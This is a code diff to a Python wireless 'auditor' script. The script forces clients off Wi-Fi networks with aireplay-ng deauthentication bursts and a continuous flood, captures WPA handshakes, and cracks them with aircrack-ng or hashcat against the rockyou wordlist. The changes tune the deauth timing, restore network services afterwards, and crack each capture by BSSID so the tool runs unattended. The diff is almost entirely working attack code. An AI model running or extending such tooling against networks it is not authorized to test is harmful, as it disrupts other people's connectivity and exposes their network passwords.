@@ -16,8 +16,9 @@ WORDLIST_DEFAULT = "/usr/share/wordlists/rockyou.txt"
 SCAN_TIMEOUT = 15
 CAPTURE_TIMEOUT_DEFAULT = 60
 DEAUTH_PACKETS = 30
-DEAUTH_INTERVAL = 8
-MAX_DEAUTH_ROUNDS = 5
+DEAUTH_INTERVAL = 6
+MAX_DEAUTH_ROUNDS = 3
+DEAUTH_TIMEOUT = 5
 TEMP_DIR = "audit_temp"
 HANDSHAKES_DIR = "handshakes"
 CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
@@ -97,6 +98,31 @@ def save_session():
             json.dump(SESSION_DATA, f, indent=2)
     except Exception as e:
         log(f"Failed to save session: {e}")
+def restore_network():
+    global SERVICES_KILLED, ORIGINAL_MODE_RESTORE, USED_AIRMON_NG
+    log("Restoring network and interface for cracking phase...")
+    kill_subprocesses()
+    kill_aircrack()
+    if ORIGINAL_MODE_RESTORE:
+        if USED_AIRMON_NG:
+            log(f"Restoring interface using airmon-ng stop {ORIGINAL_MODE_RESTORE}...")
+            run_cmd(f"airmon-ng stop {ORIGINAL_MODE_RESTORE}", check=False)
+        else:
+            log(f"Restoring interface {ORIGINAL_MODE_RESTORE} to managed mode...")
+            run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} down", check=False)
+            run_cmd(f"iw dev {ORIGINAL_MODE_RESTORE} set type managed", check=False)
+            run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} up", check=False)
+    if SERVICES_KILLED:
+        log("Restarting network services...")
+        run_cmd("systemctl restart NetworkManager wpa_supplicant", check=False)
+        run_cmd("service network-manager restart", check=False)
+        run_cmd("service wpa_supplicant restart", check=False)
+        run_cmd("dhclient -r", check=False)
+        run_cmd("dhclient", check=False)
+        log("Network services restored.")
+        SERVICES_KILLED = False
+    ORIGINAL_MODE_RESTORE = None
+    USED_AIRMON_NG = False
 def cleanup(signum=None, frame=None):
     global SERVICES_KILLED, ORIGINAL_MODE_RESTORE, USED_AIRMON_NG
     if signum:
@@ -337,9 +363,23 @@ def has_handshake(cap_file):
     return output and ("1 handshake" in output or "Handshake" in output)
 def get_essid_from_cap(cap_file):
     base = os.path.basename(cap_file)
-    name = base[:-4]  
+    name = base[:-4]
     parts = name.split('_')
     return parts[0] if parts else "Unknown"
+def extract_bssid_from_filename(filename):
+    """Extract BSSID (with colons) from filename like ESSID_BSSID.cap where BSSID is without colons."""
+    base = os.path.basename(filename)
+    base = base[:-4]  
+    parts = base.split('_')
+    if not parts:
+        return None
+    bssid_no_colon = parts[-1]
+    bssid_no_colon = re.sub(r'[^0-9A-Fa-f]', '', bssid_no_colon)
+    if len(bssid_no_colon) == 12:
+        return ':'.join(bssid_no_colon[i:i+2] for i in range(0, 12, 2))
+    if ':' in bssid_no_colon:
+        return bssid_no_colon
+    return None
 def gather_all_handshakes():
     caps = []
     if not os.path.exists(HANDSHAKES_DIR):
@@ -351,46 +391,42 @@ def gather_all_handshakes():
                 caps.append(full)
     return caps
 def batch_crack_aircrack(cap_files, wordlist):
-    global AIRCRACK_PROC
+    """Crack each .cap file individually using its BSSID to avoid interactive prompt."""
     if not cap_files:
         return {}
-    log(f"Batch cracking {len(cap_files)} handshakes with aircrack-ng...")
-    temp_out = tempfile.NamedTemporaryFile(suffix=".txt", delete=False).name
-    cmd = ["aircrack-ng", "-w", wordlist, "-l", temp_out] + cap_files
-    try:
-        AIRCRACK_PROC = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            start_new_session=True
-        )
-        output_lines = []
-        for line in AIRCRACK_PROC.stdout:
-            print(line, end='')
-            output_lines.append(line)
-        AIRCRACK_PROC.wait()
-        output = ''.join(output_lines)
-        pattern = re.compile(r'KEY FOUND!\s+\[\s*([^\]]+)\s*\]\s+([^\s]+)')
-        found = {}
-        for match in pattern.finditer(output):
-            essid = match.group(1).strip()
-            key = match.group(2).strip()
-            found[essid] = key
-        if os.path.exists(temp_out) and os.path.getsize(temp_out) > 0:
-            with open(temp_out, 'r') as f:
-                key_line = f.read().strip()
-                if key_line and not found and len(cap_files) == 1:
-                    essid = get_essid_from_cap(cap_files[0])
-                    found[essid] = key_line
-        os.unlink(temp_out)
-        return found
-    except Exception as e:
-        log(f"Batch aircrack error: {e}")
-        return {}
-    finally:
-        AIRCRACK_PROC = None
+    log(f"Batch cracking {len(cap_files)} handshakes with aircrack-ng (each file individually)...")
+    found = {}
+    total = len(cap_files)
+    for idx, cap_file in enumerate(cap_files, 1):
+        essid = get_essid_from_cap(cap_file)
+        bssid = extract_bssid_from_filename(cap_file)
+        if not bssid:
+            log(f"⚠️ Could not extract BSSID from {cap_file}. Skipping.")
+            continue
+        log(f"[{idx}/{total}] Cracking {essid} (BSSID: {bssid})...")
+        temp_out = tempfile.NamedTemporaryFile(suffix=".txt", delete=False).name
+        cmd = ["aircrack-ng", "-w", wordlist, "-b", bssid, "-l", temp_out, cap_file]
+        try:
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            for line in proc.stdout:
+                print(line, end='')
+            proc.wait()
+            if os.path.exists(temp_out) and os.path.getsize(temp_out) > 0:
+                with open(temp_out, 'r') as f:
+                    key = f.read().strip()
+                    if key:
+                        found[essid] = key
+                        log(f"✅ Key found for {essid}: {key}")
+            os.unlink(temp_out)
+        except Exception as e:
+            log(f"Error cracking {essid}: {e}")
+    return found
 def batch_crack_hashcat(cap_files, wordlist):
     if not shutil.which("hcxpcapngtool") or not shutil.which("hashcat"):
         log("Hashcat tools not found. Falling back to aircrack.")
@@ -419,6 +455,7 @@ def batch_crack_hashcat(cap_files, wordlist):
     subprocess.call(crack_cmd, shell=True)
     found = {}
     if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
+        log("Hashcat completed. Extracting results using aircrack-ng for accurate ESSID mapping.")
         found = batch_crack_aircrack(cap_files, wordlist)
     os.unlink(merged_hash)
     if os.path.exists(output_file):
@@ -538,7 +575,7 @@ def run_auditor(args):
                             try:
                                 subprocess.run(
                                     f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} -c {client} {interface} < /dev/null > /dev/null 2>&1",
-                                    shell=True, timeout=10, check=False
+                                    shell=True, timeout=DEAUTH_TIMEOUT, check=False
                                 )
                             except subprocess.TimeoutExpired:
                                 log(f"Deauth timed out for client {client}, skipping.")
@@ -547,11 +584,11 @@ def run_auditor(args):
                         try:
                             subprocess.run(
                                 f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
-                                shell=True, timeout=10, check=False
+                                shell=True, timeout=DEAUTH_TIMEOUT, check=False
                             )
                         except subprocess.TimeoutExpired:
                             log("Broadcast deauth timed out.")
-                        if deauth_rounds >= 3:
+                        if deauth_rounds == MAX_DEAUTH_ROUNDS - 1:
                             log("Escalating: flooding with continuous deauth for 5s...")
                             flood_proc = subprocess.Popen(
                                 f"aireplay-ng -0 0 -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
@@ -574,6 +611,7 @@ def run_auditor(args):
             if not handshake_found:
                 log(f"❌ Failed to capture handshake for {essid}.")
                 kill_subprocesses()
+        restore_network()
         if args.skip_crack:
             log("Skipping cracking phase.")
             return
